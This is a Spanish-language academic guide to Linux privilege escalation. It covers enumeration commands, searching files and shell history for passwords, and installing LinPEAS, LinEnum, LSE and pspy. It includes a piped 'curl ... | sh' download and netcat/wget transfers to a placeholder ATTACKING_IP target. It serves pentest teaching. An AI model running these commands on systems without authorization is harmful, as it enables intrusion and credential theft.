# Guía Completa de Escalada de Privilegios - Pentesting Académico

## Tabla de Contenidos
1. [Comandos Básicos de Enumeración](#comandos-básicos-de-enumeración)
2. [Vectores de Escalada de Privilegios](#vectores-de-escalada-de-privilegios)
3. [Herramientas Automatizadas](#herramientas-automatizadas)
4. [Instalación en Kali Linux](#instalación-en-kali-linux)
5. [Scripts de Automatización](#scripts-de-automatización)

---

## Comandos Básicos de Enumeración

### 1. Enumeración de Privilegios
```bash
# Ver permisos actuales
id
groups
whoami

# Buscar archivos con permisos especiales
find / -perm -4000 2>/dev/null  # SUID
find / -perm -2000 2>/dev/null  # SGID
```

### 2. Análisis del Usuario
```bash
# Ver información del usuario
cat /etc/passwd | grep basicftp
ls -la /home/basicftp
```

### 3. Buscar Vectores de Escalada
```bash
# Archivos escribibles por el usuario
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys
```

### 4. Servicios y Procesos
```bash
ps aux | grep basicftp
netstat -tulpn
```

---

## Vectores de Escalada de Privilegios

### 1. Kernel Exploits
```bash
# Identificar versión del kernel
uname -a
cat /proc/version

# Buscar exploits conocidos
searchsploit kernel $(uname -r)
```

### 2. Configuraciones Erróneas de Servicios
```bash
# Servicios corriendo como root
ps aux | grep "^root" | grep -v "\["

# Archivos de configuración legibles
find /etc -readable -type f 2>/dev/null | head -20
```

### 3. Variables de Entorno y PATH
```bash
# Verificar PATH manipulation
echo $PATH
env | grep -i path

# Librerías compartidas
ldd /usr/bin/basicftp 2>/dev/null
```

### 4. Tareas Programadas (Cron Jobs)
```bash
# Crontabs del sistema
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Procesos que se ejecutan periódicamente
ps aux | grep cron
```

### 5. Capabilities de Linux
```bash
# Buscar capabilities especiales
getcap -r / 2>/dev/null
```

### 6. Historial y Archivos Temporales
```bash
# Historial de comandos
cat ~/.bash_history
cat ~/.mysql_history 2>/dev/null

# Archivos temporales con información sensible
ls -la /tmp
ls -la /var/tmp
```

### 7. Passwords y Credenciales
```bash
# Buscar passwords en archivos
grep -r "password" /etc 2>/dev/null
grep -r "passwd" /etc 2>/dev/null

# Archivos de configuración con credenciales
find / -name "*.conf" -exec grep -l "pass\|user\|login" {} \; 2>/dev/null
```

### 8. NFS y Montajes
```bash
# Verificar montajes NFS
cat /etc/exports 2>/dev/null
showmount -e localhost 2>/dev/null
```

### 9. Docker y Contenedores
```bash
# Verificar si estamos en un contenedor
cat /.dockerenv 2>/dev/null
cat /proc/1/cgroup | grep docker
```

### 10. Logs del Sistema
```bash
# Logs que pueden contener información útil
ls -la /var/log
tail /var/log/auth.log 2>/dev/null
tail /var/log/syslog 2>/dev/null
```

---

## Script Automatizado para Enumeración

```bash
#!/bin/bash
echo "=== PRIVILEGE ESCALATION ENUMERATION ==="
echo "[+] Basic System Info:"
uname -a
echo ""

echo "[+] Current User Context:"
id
echo ""

echo "[+] SUID/SGID Files:"
find / -perm -4000 -type f 2>/dev/null | head -10
echo ""

echo "[+] Writable Files:"
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys | head -10
echo ""

echo "[+] Interesting Files:"
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | head -10
```

---

## Herramientas Automatizadas

### 1. LinPEAS (Linux Privilege Escalation Awesome Script)
```bash
# Método 1: Descarga directa
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Método 2: Descarga y ejecución manual
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Método 3: Desde el repositorio
git clone https://github.com/carlospolop/PEASS-ng.git
cd PEASS-ng/linPEAS
./linpeas.sh
```

### 2. LinEnum
```bash
# Descarga directa
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# Con opciones específicas
./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
```

### 3. Linux Smart Enumeration (LSE)
```bash
# Descarga
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
chmod +x lse.sh

# Ejecución con diferentes niveles
./lse.sh -l1  # Nivel básico
./lse.sh -l2  # Nivel intermedio
./lse.sh -l3  # Nivel completo
```

### 4. Linux Exploit Suggester
```bash
# Versión en Bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# Versión en Perl
wget https://raw.githubusercontent.com/PenturaLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl
perl Linux_Exploit_Suggester.pl
```

### 5. Pspy (Monitor de procesos sin root)
```bash
# Descargar binario precompilado
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64

# Para arquitectura 32-bit
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32
```

---

## Instalación en Sistemas Restringidos

### Método 1: Transferencia con netcat
```bash
# En tu máquina atacante:
nc -nlvp 4444 < linpeas.sh

# En el sistema objetivo:
nc ATTACKING_IP 4444 > linpeas.sh
```

### Método 2: Usando Python
```bash
# En tu máquina atacante:
python3 -m http.server 8000

# En el sistema objetivo:
wget http://ATTACKING_IP:8000/linpeas.sh
```

### Método 3: Base64 encoding
```bash
# En tu máquina atacante:
base64 -w0 linpeas.sh

# En el sistema objetivo:
echo "ENCODED_STRING" | base64 -d > linpeas.sh
```

---

## Instalación en Kali Linux

### Estado de las Herramientas en Kali Linux

#### ✅ Ya Incluidas en Kali Linux
```bash
# Estas herramientas YA están en Kali:
- LinEnum (en /usr/share/linux-exploit-suggester/)
- Linux Exploit Suggester
- Muchas herramientas de PEASS-ng
```

#### 🔍 Verificar qué tienes instalado
```bash
# Buscar herramientas ya instaladas
locate linpeas
locate linenum
locate lse
find /usr/share -name "*exploit*" -type d
```

### 📦 Instalación Permanente en Kali

#### Método 1: Instalar en /opt (Recomendado)
```bash
sudo mkdir -p /opt/privilege-escalation
cd /opt/privilege-escalation

# Descargar todas las herramientas
sudo wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
sudo wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
sudo wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh

# Dar permisos
sudo chmod +x *.sh

# Crear enlaces simbólicos para acceso global
sudo ln -s /opt/privilege-escalation/linpeas.sh /usr/local/bin/linpeas
sudo ln -s /opt/privilege-escalation/LinEnum.sh /usr/local/bin/linenum
sudo ln -s /opt/privilege-escalation/lse.sh /usr/local/bin/lse
```

#### Método 2: Clonar repositorios completos
```bash
cd /opt
sudo git clone https://github.com/carlospolop/PEASS-ng.git
sudo git clone https://github.com/rebootuser/LinEnum.git
```

### 🚀 Después de instalar una vez:
```bash
# Puedes usarlas desde cualquier lugar:
linpeas
linenum
lse

# O transferirlas a sistemas objetivo:
python3 -m http.server 8000
# Desde otra terminal:
cp /opt/privilege-escalation/linpeas.sh .
```

---

## Scripts de Automatización

### Script de Instalación Automática
```bash
#!/bin/bash
echo "[+] Installing Privilege Escalation Tools..."

# Crear directorio
mkdir -p ~/pentest-tools
cd ~/pentest-tools

# LinPEAS
echo "[+] Downloading LinPEAS..."
wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh

# LinEnum
echo "[+] Downloading LinEnum..."
wget -q https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh

# LSE
echo "[+] Downloading LSE..."
wget -q https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
chmod +x lse.sh

# Linux Exploit Suggester
echo "[+] Downloading Linux Exploit Suggester..."
wget -q https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh

# Pspy
echo "[+] Downloading Pspy..."
wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64

echo "[+] All tools installed in ~/pentest-tools/"
ls -la ~/pentest-tools/
```

### Script de Instalación Permanente para Kali
```bash
#!/bin/bash
echo "[+] Setting up permanent privilege escalation tools in Kali..."

# Crear directorio en /opt
sudo mkdir -p /opt/privesc-tools
cd /opt/privesc-tools

# Descargar herramientas
echo "[+] Downloading tools..."
sudo wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
sudo wget -q https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
sudo wget -q https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
sudo wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64

# Permisos
sudo chmod +x *

# Enlaces simbólicos para acceso global
sudo ln -sf /opt/privesc-tools/linpeas.sh /usr/local/bin/linpeas
sudo ln -sf /opt/privesc-tools/LinEnum.sh /usr/local/bin/linenum
sudo ln -sf /opt/privesc-tools/lse.sh /usr/local/bin/lse
sudo ln -sf /opt/privesc-tools/pspy64 /usr/local/bin/pspy

echo "[+] Tools installed! You can now use: linpeas, linenum, lse, pspy"
echo "[+] Tools location: /opt/privesc-tools/"
```

### Script de Actualización Automática
```bash
#!/bin/bash
# Script para actualizar herramientas
cd /opt/privesc-tools
echo "[+] Updating privilege escalation tools..."
sudo wget -q -O linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
sudo wget -q -O LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
sudo chmod +x *
echo "[+] Tools updated!"
```

---

## Uso de las Herramientas

### LinPEAS - Uso Completo
```bash
# Ejecución básica
./linpeas.sh

# Con output a archivo
./linpeas.sh | tee linpeas_output.txt

# Solo buscar passwords
./linpeas.sh -a
```

### LinEnum - Opciones Útiles
```bash
# Ejecución completa
./LinEnum.sh -t

# Buscar archivos específicos
./LinEnum.sh -k password

# Output detallado
./LinEnum.sh -r report
```

### LSE - Niveles de Análisis
```bash
# Análisis básico (rápido)
./lse.sh -l1

# Análisis completo (lento pero exhaustivo)
./lse.sh -l2

# Incluir tests interactivos
./lse.sh -i
```

---

## Transferir a Sistemas Objetivo

Una vez instaladas en Kali, puedes transferirlas fácilmente:

```bash
# Servidor HTTP simple
cd /opt/privesc-tools
python3 -m http.server 8000

# En el sistema objetivo:
wget http://KALI_IP:8000/linpeas.sh
```

---

## Para tu Reporte Académico

### Documenta estos aspectos:
- Configuración de sudo (ya verificada como segura)
- Permisos de archivos críticos del sistema
- Servicios expuestos y su configuración
- Políticas de contraseñas y autenticación
- Logs de seguridad y monitoreo

### Vectores más críticos en entornos reales:
1. Configuraciones erróneas de sudo
2. Servicios mal configurados
3. Kernel exploits
4. Credenciales hardcodeadas
5. Capabilities mal asignadas

---

## Consideraciones de Seguridad

⚠️ **Para uso académico/autorizado únicamente:**
- Estas herramientas pueden ser detectadas por antivirus
- Siempre obtén autorización antes de usarlas
- Algunos scripts pueden hacer ruido en logs del sistema
- Usa en entornos de laboratorio controlados

---

## Herramientas Recomendadas

1. **LinPEAS** - Script de enumeración automática
2. **LinEnum** - Enumeración básica del sistema
3. **Linux Smart Enumeration (LSE)** - Análisis inteligente
4. **PEASS-ng** - Suite completa de escalada

---

*Documento creado para fines académicos y educativos. Úsalo de manera responsable y ética.*